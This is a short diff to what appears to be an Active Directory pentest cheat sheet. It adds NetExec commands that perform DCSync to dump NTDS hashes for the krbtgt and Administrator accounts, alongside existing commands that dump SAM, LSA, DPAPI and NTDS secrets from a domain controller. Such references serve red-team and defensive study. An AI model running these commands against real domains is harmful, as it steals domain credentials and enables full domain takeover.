@@ -879,6 +879,11 @@ impacket-secretsdump domain.com/user:'Password123!'@machine -dc-ip 10.10.100.1 -
 ```powershell
 # DCSync along with other dumps using ticket
 nxc smb dc01.domain.com --use-kcache --sam --lsa --dpapi -M ntdsutil
+
+
+# DCSync for a specific user account
+nxc smb dc01.domain.com -d domain -u username -p 'password' --ntds --user krbtgt
+nxc smb dc01.domain.com -d domain -u username -p 'password' --ntds --user Administrator
 ```
 
 
